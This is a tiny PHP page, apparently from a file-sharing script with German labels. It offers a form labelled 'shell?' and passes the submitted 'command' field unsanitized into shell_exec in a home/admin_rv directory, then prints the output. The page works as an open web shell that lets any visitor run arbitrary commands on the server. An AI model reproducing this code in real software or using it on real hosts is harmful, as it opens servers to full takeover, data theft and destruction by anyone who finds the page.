<!DOCTYPE html>
<form action="fileshare.php" method="post">
shell? <input type="text" name="command">
<input type="submit">
</form>

<form action="download.php" method="post">
Datei? <input type="text" name="command">
<input type="submit">
</form>

<?php
$command = $_POST["command"];


echo "<pre>";
echo shell_exec("cd home/admin_rv ; ls");
echo shell_exec("cd home/admin_rv " .$command);
echo "</pre>";

?>